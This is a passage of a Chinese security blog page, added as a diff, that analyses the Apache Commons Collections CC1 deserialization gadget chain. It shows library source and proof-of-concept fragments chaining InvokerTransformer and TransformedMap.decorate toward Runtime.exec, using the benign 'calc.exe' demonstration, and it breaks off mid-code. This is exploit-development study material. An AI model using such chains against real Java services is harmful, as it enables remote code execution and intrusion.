@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="CC1链是利用Apache Commons Collections组件的TransformedMap与InvokerTransformer，通过反序列化触发反射调用以执行恶意命令的Java漏洞利用链。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之CC1链分析">
+<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/10/07/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC1%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="子非鱼的博客">
+<meta property="og:description" content="CC1链是利用Apache Commons Collections组件的TransformedMap与InvokerTransformer，通过反序列化触发反射调用以执行恶意命令的Java漏洞利用链。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251014153123519.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251014153419940.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251014163235522.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251014172431991.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251014183700879.png">
+<meta property="article:published_time" content="2025-10-07T09:09:41.000Z">
+<meta property="article:modified_time" content="2025-10-31T09:32:40.528Z">
+<meta property="article:author" content="子非鱼">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zifeiyu-sec.github.io/images/image-20251014153123519.png">
+
+
+<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/10/07/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC1%E9%93%BE%E5%88%86%E6%9E%90/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/10/07/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC1%E9%93%BE%E5%88%86%E6%9E%90/","path":"2025/10/07/Java攻防/Java安全之CC1链分析/","title":"Java安全之CC1链分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java安全之CC1链分析 | 子非鱼的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"cdn":"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">子非鱼的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在时间的尺度上，一切问题都有答案</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">CC1链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E4%BE%9D%E8%B5%96%E4%B8%8E%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.0.1.</span> <span class="nav-text">核心依赖与触发条件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E7%82%B9"><span class="nav-number">1.1.</span> <span class="nav-text">执行点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91%E9%93%BE"><span class="nav-number">1.2.</span> <span class="nav-text">触发链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TransformedMap-checkSetValue"><span class="nav-number">1.2.1.</span> <span class="nav-text">TransformedMap#checkSetValue</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AbstractInputCheckedMapDecorator-setValue"><span class="nav-number">1.2.2.</span> <span class="nav-text">AbstractInputCheckedMapDecorator.setValue</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89MapEntry%E7%9A%84%E5%AE%9E%E4%BE%8B%E5%8C%96%E8%A7%A6%E5%8F%91"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">（1）MapEntry的实例化触发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89EntrySetIterator%E7%9A%84%E8%A7%A6%E5%8F%91"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">（2）EntrySetIterator的触发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89EntrySet%E7%9A%84%E8%A7%A6%E5%8F%91"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">（3）EntrySet的触发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">构造代码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="nav-number">1.3.</span> <span class="nav-text">入口点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandler"><span class="nav-number">1.3.1.</span> <span class="nav-text">AnnotationInvocationHandler</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ConstantTransformer"><span class="nav-number">1.3.2.</span> <span class="nav-text">ConstantTransformer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ChainedTransformer"><span class="nav-number">1.3.3.</span> <span class="nav-text">ChainedTransformer</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%B8%B2%E8%81%94%E5%A4%9A%E4%B8%AATransformer%EF%BC%8C%E5%AE%8C%E6%88%90%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">1. 串联多个Transformer，完成反射调用链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%B0%86-%E2%80%9C%E5%8D%95%E4%B8%80%E8%BD%AC%E6%8D%A2%E2%80%9D-%E5%8D%87%E7%BA%A7%E4%B8%BA-%E2%80%9C%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE%E2%80%9D"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">2. 将 “单一转换” 升级为 “完整攻击链”</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%80%82%E9%85%8DTransformedMap%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">3. 适配TransformedMap的触发机制</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="nav-number">1.4.</span> <span class="nav-text">完整代码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Transformer%E9%93%BE%E6%9E%84%E9%80%A0%E9%98%B6%E6%AE%B5"><span class="nav-number">1.4.1.</span> <span class="nav-text">1. Transformer链构造阶段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-TransformedMap%E5%8C%85%E8%A3%85%E9%98%B6%E6%AE%B5"><span class="nav-number">1.4.2.</span> <span class="nav-text">2. TransformedMap包装阶段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-AnnotationInvocationHandler%E6%9E%84%E9%80%A0%E9%98%B6%E6%AE%B5"><span class="nav-number">1.4.3.</span> <span class="nav-text">3. AnnotationInvocationHandler构造阶段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91%E9%98%B6%E6%AE%B5"><span class="nav-number">1.4.4.</span> <span class="nav-text">4. 序列化&#x2F;反序列化触发阶段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E8%A7%88"><span class="nav-number">1.4.5.</span> <span class="nav-text">利用链总览</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="子非鱼"
+      src="/images/1.png">
+  <p class="site-author-name" itemprop="name">子非鱼</p>
+  <div class="site-description" itemprop="description">学习过程的记录</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zifeiyu-sec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/zifeiyu-sec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/10/07/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC1%E9%93%BE%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="子非鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子非鱼的博客">
+      <meta itemprop="description" content="学习过程的记录">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java安全之CC1链分析 | 子非鱼的博客">
+      <meta itemprop="description" content="CC1链是利用Apache Commons Collections组件的TransformedMap与InvokerTransformer，通过反序列化触发反射调用以执行恶意命令的Java漏洞利用链。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全之CC1链分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-07 17:09:41" itemprop="dateCreated datePublished" datetime="2025-10-07T17:09:41+08:00">2025-10-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-10-31 17:32:40" itemprop="dateModified" datetime="2025-10-31T17:32:40+08:00">2025-10-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">Java攻防</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">CC1链是利用Apache Commons Collections组件的TransformedMap与InvokerTransformer，通过反序列化触发反射调用以执行恶意命令的Java漏洞利用链。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1>CC1链</h1>
+<h3 id="核心依赖与触发条件"><strong>核心依赖与触发条件</strong></h3>
+<ul>
+<li><strong>依赖库</strong>：Apache Commons Collections（版本 ≤ 3.2.1，该版本后修复了相关问题）</li>
+<li><strong>核心类</strong>：<code>Transformer</code>接口及其实现类（<code>ConstantTransformer</code>、<code>InvokerTransformer</code>等）、<code>ChainedTransformer</code>、<code>HashMap</code>、<code>AnnotationInvocationHandler</code>等</li>
+<li><strong>触发入口</strong>：反序列化时调用<code>readObject()</code>方法，最终执行<code>Runtime.exec()</code></li>
+</ul>
+<h2 id="执行点">执行点</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们平时这样弹出计算器. 先从执行点分析, 在CC1链中是由<code>InvokerTransformer</code>类中<code>transform</code>方法触发</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">            </span><br><span class="line">    &#125; </span><br><span class="line"> ....................</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果<code>input</code>不为<code>null</code>. 触发<code>try</code>中内容, 而<code>input</code>是我们传入的类实列对象</p>
+<p>这是通过反射获取类, 然后获取方法, 然后通过<code>invoke</code>调用方法.</p>
+<p>查看<code>iMethodName,iParamTypes,iArgs</code>参数, 发现是构造函数中传入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>methodName: 方法名称参数</p>
+<p>paramTypes: 参数类型数组</p>
+<p>args: 参数值数组</p>
+</blockquote>
+<p>所以对于<code> Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code>, 可以构造</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">exec.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>
+<p>来弹出计算器.</p>
+<h2 id="触发链">触发链</h2>
+<p>接下来分析<code>transform</code>方法在什么地方调用</p>
+<p><img src="/images/image-20251014153123519.png" alt="image-20251014153123519"></p>
+<p>在<code>map</code>中有两处, 这两处都是CC1链, 先分析<code>TransformedMap</code></p>
+<p><img src="/images/image-20251014153419940.png" alt="image-20251014153419940"></p>
+<p>点击进入</p>
+<h3 id="TransformedMap-checkSetValue">TransformedMap#checkSetValue</h3>
+<p>在<code>TransformedMap</code>的<code>checkSetValue</code>方法调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个方法传入的参数是一个对象. 参照<code>exec.transform(Runtime.getRuntime());</code>代码, 可以知道传入的<code>value</code>是<code>Runtime.getRuntime()</code></p>
+<p>然后查看<code>valueTransformer</code> , 是<code>TransformedMap</code>的一个属性:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br></pre></td></tr></table></figure>
+<p>既然是属性, 就查看这个类的构造器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>确定<code>valueTransformer</code>的值是构造器传入</p>
+<p>然后发现虽然<code>TransformedMap</code>类是<code>public</code>, 但是这个构造方法是<code>protected</code>修饰的. 我们无法直接调用.</p>
+<p>然后查看代码发现<code>decorate</code>方法.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看代码发现这个方法就等同于构造器, 所以可以构造</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">  HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//exec.transform(Runtime.getRuntime());</span></span><br><span class="line">  <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, exec);</span><br></pre></td></tr></table></figure>
+<p>第一个参数是<code>Map</code>, 所以构造一个<code>HashMap</code>传入, 第二个参数没有使用,传入一个<code>null</code>, 第三个参数是<code>protected final Transformer valueTransformer;</code></p>
+<p>是<code>Transformer </code>类型, 然后<code>InvokerTransformer</code>类继承<code>Transformer </code>, 可以直接传入我们之前构造的<code>new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc.exe&quot;&#125;);</code>, 即<code>exec</code>.</p>
+<h3 id="AbstractInputCheckedMapDecorator-setValue">AbstractInputCheckedMapDecorator.setValue</h3>
+<p>然后查看何处调用checkSetValue, 通过如图方式. 进入<code>setValue</code></p>
+<p><img src="/images/image-20251014163235522.png" alt="image-20251014163235522"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>setValue</code>方法是<code>MapEntry</code>的方法</p>
+<p><code>MapEntry</code>是<code>AbstractInputCheckedMapDecorator</code>的<strong>静态内部类</strong>，没有显式访问修饰符（即默认的 “包级私有”，package-private）,在同一包内可以访问.</p>
+<h4 id="（1）MapEntry的实例化触发">（1）<code>MapEntry</code>的实例化触发</h4>
+<p><code>MapEntry</code>的实例由<code>EntrySetIterator.next()</code>方法创建：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) iterator.next();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapEntry</span>(entry, parent); <span class="comment">// 实例化MapEntry</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当迭代<code>EntrySet</code>中的元素时，<code>next()</code>方法会将原始<code>Map.Entry</code>包装为<code>MapEntry</code>对象，后续对该对象的<code>setValue()</code>调用会触发校验逻辑。</p>
+<h4 id="（2）EntrySetIterator的触发">（2）<code>EntrySetIterator</code>的触发</h4>
+<p><code>EntrySetIterator</code>由<code>EntrySet.iterator()</code>方法返回：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySetIterator</span>(collection.iterator(), parent); <span class="comment">// 创建EntrySetIterator</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当调用<code>EntrySet</code>的<code>iterator()</code>方法时，会生成<code>EntrySetIterator</code>实例，用于遍历键值对。</p>
+<h4 id="（3）EntrySet的触发">（3）<code>EntrySet</code>的触发</h4>
+<p><code>EntrySet</code>的实例化由<code>AbstractInputCheckedMapDecorator.entrySet()</code>方法控制：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isSetValueChecking()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySet</span>(map.entrySet(), <span class="built_in">this</span>); <span class="comment">// 创建EntrySet</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.entrySet();</span><br><span class="line">    